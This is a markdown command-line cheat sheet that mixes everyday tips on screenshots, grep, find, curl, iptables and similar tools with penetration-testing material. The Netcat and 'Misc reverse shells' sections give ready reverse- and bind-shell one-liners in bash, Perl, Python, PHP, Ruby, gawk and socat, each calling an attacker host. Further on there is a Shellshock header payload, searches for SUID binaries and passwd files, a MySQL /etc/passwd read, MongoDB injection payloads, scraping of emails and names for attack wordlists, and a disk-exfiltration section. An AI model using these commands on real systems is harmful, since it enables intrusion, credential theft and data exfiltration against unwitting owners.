# Screenshots
## OS X
- Command-Shift-3: Full screen to desktop
- Command-Shift-4, select an area: Area to desktop
- Command-Shift-4, space, click a window: Window to desktop
- Command-Control-Shift-3: Full screen to clipboard
- Command-Control-Shift-4, select an area: Area to clipboard
- Command-Control-Shift-4, space, click a window: Window to clipboard

## Windows
- PrtScr: full screenshot to clipboard
- Windows-PrtScr: full screen to "Screenshots" folder
- Alt-PrtScr: active window to clipboard

## KDE
- Use 'ksnapshot' utility

## Using imagemagick
```
import -window root -display :0 whatever.png
```

## Firefox
```
Shift + F2
at the >> prompt: screenshot --fullpage <filename>
```

## Linux in general
- Use [shutter](http://shutter-project.org/). Its one of the best
screenshot tools I've found. Has editing and upload capabilities.

# OS X Power Saving
- Temporarily turn off sleep
```
sudo pmset noidle
```

- Turn off sleep
```
sudo pmset sleep 0
```

- Sleep after 15 minutes
```
sudo pmset sleep 15
```

# Sorting lists of IP addresses
- Using GNU sort (possibly others), there is a -V flag that sorts by software
  version numbers. This works great for IP addresses so you don't get lists like this:
```
1.1.1.1
1.1.1.10
1.1.1.2
...
```

```
sort -V filename
```

# ASCII/Hexadecimal/decimal/octal reference on Linux/BSD systems
- One of the handiest manpages:
```
man 7 ascii
```

# Netcat
- Reverse shell
```
On attacking machine: nc -lp PORT
On target machine: nc -e /bin/sh IP.OF.ATTACKER PORT
```

- When -e flag does not exist:
```
On attacking machine: nc -lp PORT

On target machine:
mknod /tmp/datapipe p
/bin/bash 0</tmp/datapipe | nc IP.OF.ATTACKER PORT 1>/tmp/datapipe
```

- Bind a shell to a port:
```
nc -lp PORT -e /bin/sh
```

- Simple port scanner
```
nc -v -n -w1 TARGET 1-1024
```

# Misc reverse shells

Most (all) of these require opening a listener with netcat or
ncat. These are very useful if netcat isn't available or you cannot
write to a disk on a target computer. Sometimes Python may be
available on one machine, but Perl is on another. Some of these can be
modified and injected or included in web applications in certain
cases. Thanks to pentestmonkey.net for most of these.

- Spawning a pty w/ Python for better control of reverse shells
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

- Bash using /dev/tcp
```
bash -i >& /dev/tcp/ATTACKER.IP.HERE/PORT 0>&1
```

- Perl
```
perl -e 'use Socket;$i="ATTACKER.IP.HERE";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

- Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

- Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

- X11
```
On attacking host, X11 must be accessible by the target machine:
Xnest :1
xhost +TARGET.IP.HERE

On target:
xterm -display ATTACKER.IP.HERE:1
```

- gawk
```
gawk 'BEGIN {P=443;S="bkd> ";H="192.168.1.100";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
```

- socat
This is a really nice shell with tab completion and interaction and the whole shooting match.
```
socat tcp:192.168.10.126:2222 exec:"bash -i",pty,stderr,setsid,sigint,sane
```

# grep
- Multiple search terms:
```
grep -e term1 -e term2 <file>
```

- Exclude term:
```
grep -v term <file>
```

- Exclude multiple terms:
```
grep -v -e term1 -e term2 <file>
```

- Print file names and line numbers for matches:
```
grep -Hn term
```

- Case insensitive:
```
grep -i term <file>
```

- Strip # comments:
```
grep -v "^#" <file>
```

- Strip ; comments:
```
grep -v "^;" <file>
```

- Shorthand character sets:
```
- [:alnum:]  -- Letters and numbers
- [:alpha:]  -- Letters
- [:digit:]  -- Numbers
- [:punt:]   -- Punctuation characters
- [:blank:]  -- Space and tab
- [:cntrl:]  -- Control characters (000 - 037 and 177 octal)
- [:lower:]  -- Lowercase letters
- [:upper:]  -- Uppercase letters
- [:space:]  -- Whitespace characters )tab, newline, vertical tab, carriage return, ...
- [:xdigit:] -- Hexadecimal digits: 0-9, a-f, A-F
```

- Pull IP addresses from a file
```
grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' <file>

actual valid IPs:
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' <file>
```

- Pull networks in CIDR notation from a file (127.0.0.0/24)
```
grep -o -E '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/[[:digit:]]+'
```

# tac (backwards cat)

This is part of the *GNU coreutils* package. It reads and prints a
file from the bottom up. VERY useful for logfiles.

- Linux
```
tac logfile | less
```

- OS X / BSD
```
gtac logfile | less
```

- BSD *tail -r*
```
tail -r logfile | less
```

# Using Nmap to generate lists of IP addresses

- Sometimes a tool will not allow you use CIDR notation to express
  network addresses, or will require you to provide it a list of IP
  addresses. Nmap provides the -sL (list scan) option that can generate
  these lists easily, complete with host and network exclusion, ranges,
  and so on:

```
nmap -n -sL 10.10.0.0/22 10.100.0.32/27 192.168.0.2-254 \
            --exclude 192.168.0.250,10.10.0.3.254       \
            | grep "Nmap scan report for"               \
            | awk {'print $5'}
```

- You can also omit the -n flag and easily resolve ranges of IP
  addresses. If an IP address resolves, it will display "hostname (ip
  address)". If it does not resolve, it will simply display the IP
  address:

```
nmap -sL 10.10.0.0/22 | awk {'print $5, $6'}
```

- Sometimes, you may need to use a different DNS server rather than
  whatever is in your /etc/resolv.conf to mass resolve a list of IPs:

```
nmap -n -sL 10.10.0.0/24      \
| grep "Nmap scan report for" \
| awk {'print $5'}            \
| while read ip; 
   do host $ip ALTERNATEDNSSERVERGOESHERE | grep "domain name pointer";
done
```

# find

- Find suid binaries:
```
find / -perm -04000 -exec ls -l {} \; 2>/dev/null
```

- Find world-writable files:
```
find / -type f -perm -o=w -exec ls -l {} \; 2>/dev/null
```

- Find world-writable directories:
```
find / -type d -perm -o=w -exec ls -l {} \; 2>/dev/null
```

- Find files with "passwd" in their names. This throws up a lot of
  false positives in most cases, but sometimes you can find readable
  hashes to crack:
  
```
find / -name "*passwd*" -type f -exec ls -l {} \; 2>/dev/null
```

- Find files modified today and this week respectively:
```
find / -mtime -1 -exec ls -l {} \; 2>/dev/null
find / -mtime -7 -exec ls -l {} \; 2>/dev/null
```


# curl

- Get HTTP headers from a site:
```
curl -I http://www.google.com
```

- Get HTTP headers from a site that is using SSL:
```
curl -kI https://www.google.com
```

- Display info about your public IP:
```
curl ipinfo.io
```

- Extract email addresses from URL:
```
curl http://www.foo.com/whatever.html 2>/dev/null        \
| grep -Eio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' \
| sort | uniq
```

- Extract anchors from URL (thanks bashitsu!). This is very useful for
  getting a basic layout of a site, fingerprinting software, and much
  more:
```
curl http://www.foo.com 2>/dev/null       \
| grep -Eio "(src|href) *= *[\"'][^\"']*" \
| grep -Eo "[\"'].*"                      \
| cut -c2- | sort | uniq
```

- Extract a set of unique words from a site. This is sometimes helpful
  in making dictionaries to attack a target with. This requires the
  'html2text' utility:
```
curl http://www.foo.com 2>/dev/null | html2text | tr " " "\n" | sort | uniq
```

- Attempt to pull names from a site. This isn't foolproof, as the
  output will still have to be scoured. (Thanks again, bashitsu!):
```
CAPWORD="([A-Z]{1}['a-z]+)";
curl http://www.foo.com 2>/dev/null        \
| grep -Eo -e "$CAPWORD $CAPWORD"          \
           -e "$CAPWORD [A-Z]{1} $CAPWORD" \
           -e "$CAPWORD $CAPWORD $CAPWORD" \
| sort | uniq -c
```

- Extract phone numbers from a site:
```
curl http://www.foo.com 2>/dev/null \
| html2text                         \
| grep -io '\(([0-9]\{3\})\|[0-9]\{3\}\)[ -.]\?[0-9]\{3\}[ -.]\?\([0-9]\{4\}\|[A-Z]\{4\}\)'
```

- Shellshock
```
curl -H "User-Agent: () { :; }; /bin/ls" http://vulnerablesitegoeshere.net/
```

- As a portscanner
```
for i in {1..65535}; do curl -s -m 2 localhost:$i >/dev/null; if [ ! $? -eq 7 ] && [ ! $? -eq 28 ]; then echo open: $i; fi; done
```

For a more robust script that uses curl to portscan hosts, peep this:
https://github.com/droberson/curl-portscan

# Copy and paste using GNU screen

Sometimes you may need to copy and paste terminal output, but you
either do not have gpm installed or even have a mouse. Here's how to
copy and paste using screen:

```
screen
`command you need output from`
Control+a, [
move cursor to the start position using Emacs movement keystrokes or arrows
Hit space to set starting position
select text you want to copy using arrows or Emacs keystrokes
Hit space to set ending position
Control+a, ] will paste
```

# mysql

- Show userlist:
```
select user,host,password from mysql.user;
```

- Show databases, tables, and other basics:
```
show databases;
use database;
show tables;
describe table;
```

- Read files from local filesystem:
```
select load_file("/etc/passwd");
```

- Show crashed tables:
```
show table status where comment like "%crashed%";
```

- Change a user's password:
```
update mysql.user set password=PASSWORD('password') where user='user';
flush privileges;
```

# mongodb

- example of testing for injections
```
{"username":{"$gt":""}."password":{"$gt":""}}
```

- password leaking
```
{"user":"admin","pass":{"$regex":"^password"}}
```

# bash/zsh keystrokes

bash and zsh are different, but these keystrokes work for both. They
are useful to know in case you are on a jacked up terminal, your
keyboard is missing certain keys, and they are just plain faster once
you get the hang of them. Most of these also apply to Emacs and
editing text within Chrome.

```
Control + a -- place cursor at beginning of line
Control + e -- place cursor at end of line

Control + h -- delete character before cursor (backspace)
Control + d -- delete character after cursor (delete)

Arrow keys and these do the same thing:
Control + f -- move cursor forward
Control + b -- move cursor backwards
Control + p -- move cursor up (previous command)
Control + n -- move cursor down (next command)

Control + r -- reverse search history
Control + g -- exit search

Control + k -- cut line after cursor into clipboard
Control + u -- cut line before cursor into clipboard
Control + y -- 'yank' (paste) clipboard contents

Control + l -- clear the screen
```

# convert ASCII strings of hex back into binary
```
xxd -r -p file.hex > file.bin
```

# rot13 using tr
```
echo <rot13string> |tr a-zA-Z n-za-mN-ZA-M
```

# Wardriving

## Make your laptop speak ESSIDs while roaming around (stolen from @climagic on Twitter)
```
while :;do iwlist wlan0 scan |awk -F\" '/ESSID/{print $2}' |espeak;done
```

# iptables

## Basic Blocking

### All traffic from a host
```
iptables -A INPUT -s ip.address.here -j DROP
```

### Specific port
```
iptables -A INPUT -s ip.address.here -p tcp --destination-port 80 -j DROP
```

## Unblocking
```
iptables -D INPUT -s ip.address.here -j DROP
```

## Rate Limiting

This example locks IP addresses out if they exceed 4 connections to
port 22 (SSH) in 60 seconds. This can be modified/tuned for other
services such as HTTP to throw a wrench in tools such as Nikto or
Dirbuster.

```
iptables -N LOGDROP
iptables -A LOGDROP -j LOG
iptables -A LOGDROP -j DROP
iptables -I INPUT -p tcp --dport 22 -i eth0 -m state --state NEW -m recent --set
iptables -I INPUT -p tcp --dport 22 -i eth0 -m state --state NEW -m recent  --update --seconds 60 --hitcount 4 -j LOGDROP
```

## Calculate amount of bandwidth something used
```
iptables -I INPUT 1 -s host -j ACCEPT
iptables -I OUTPUT 1 -d host -j ACCEPT
iptables -Z
...
...
Do whatever you wanted to measure bandwidth for
...
...
iptables -vn -L; # this displays a printout showing how much data was transferred.
```

# Data exfiltration

## dd a disk and pass the image over ssh
```
dd if=/dev/whatever bs=65535 conv=noerror,sync | ssh -C user@host "cat >image.dd"
```

## Using Python's built in HTTP servers

### Python2
```
python -m SimpleHTTPServer [<port>]
```

### Python3
```
python3 -m http.server [<port>]
```
